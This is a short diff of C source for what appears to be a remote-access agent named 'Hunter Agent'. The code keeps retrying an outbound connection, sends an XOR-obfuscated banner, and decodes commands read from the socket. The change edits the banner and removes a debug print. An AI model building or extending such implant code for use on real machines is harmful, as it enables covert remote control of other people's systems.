@@ -29,15 +29,14 @@ int main(void)
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-	char* xorhello = XOR("Hunter Agent 1.0\n", key, 17, keylen);
-	write(sock, xorhello, 17);
+	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
+	write(sock, xorhello, 18);
 
 	while (connection_established == 0)
 	{
 		while((n = read(sock, buf, MAXBUF)) > 0)
 		{
 			char* xorbuf = XOR(buf, key, n, keylen);
-			printf("Buffer is: %s\n", xorbuf);
 			// TODO: Revamp argument parsing (there's a better way! :)
 			if(strncmp(xorbuf, "help\n", 5) == 0)
 			{
